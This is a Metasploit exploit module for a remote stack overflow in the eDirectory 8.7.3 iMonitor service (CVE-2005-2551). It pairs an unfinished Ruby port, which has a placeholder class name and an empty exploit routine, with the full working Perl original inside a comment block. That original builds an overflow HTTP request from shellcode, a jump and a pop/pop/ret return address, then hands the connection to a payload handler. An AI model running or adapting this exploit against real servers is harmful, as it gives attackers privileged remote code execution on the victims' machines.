require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'eDirectory 8.7.3 iMonitor Remote Stack Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in eDirectory 8.7.3
				iMonitor service. This vulnerability was discovered by Peter
				Winter-Smith of NGSSoftware.
					
			},
			'Author'         => [ 'anonymous' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '18703'],
					[ 'CVE', '2005-2551'],
					[ 'BID', '14548'],
					[ 'MIL', '89'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 4150,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, winxp, win2k, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 11 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::edirectory_imonitor;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'eDirectory 8.7.3 iMonitor Remote Stack Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'anonymous' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'winxp', 'win2k', 'win2003' ],
	'Priv'  => 1,

	'AutoOpts'  =>  { 'EXITFUNC' => 'thread' },

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8008 ],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 0x1036,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%",
		'Keys' 	    => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in eDirectory 8.7.3 iMonitor
	service. This vulnerability was discovered by Peter Winter-Smith of 
	NGSSoftware.

}),

	'Refs'  =>
	  [
		['OSVDB', '18703'],
		['CVE',   '2005-2551'],
		['BID',   '14548'],
		['MIL',   '89'],
	  ],

	'Targets' =>
	  [
		[ 'Windows (ALL) - eDirectory 8.7.3 iMonitor', 0x63501f15] # pop/pop/ret
	  ],

	'Keys'  => ['imonitor'],

	'DisclosureDate' => 'Aug 11 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	# pop/pop/ret in ndsimon.dlm on our jump to our shellcode
	my $req = $shellcode . "\x90\x90\xeb\x04" . pack('V', $target->[1]) . "\xe9\xbd\xef\xff\xff" . ("B" x 0xD0);
	my $request =
	  "GET /nds/$req HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	$s->Send($request);

	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds");
	select(undef, undef, undef, 4);

	$self->Handler($s);
	return;
}

1;

=end


end
end	
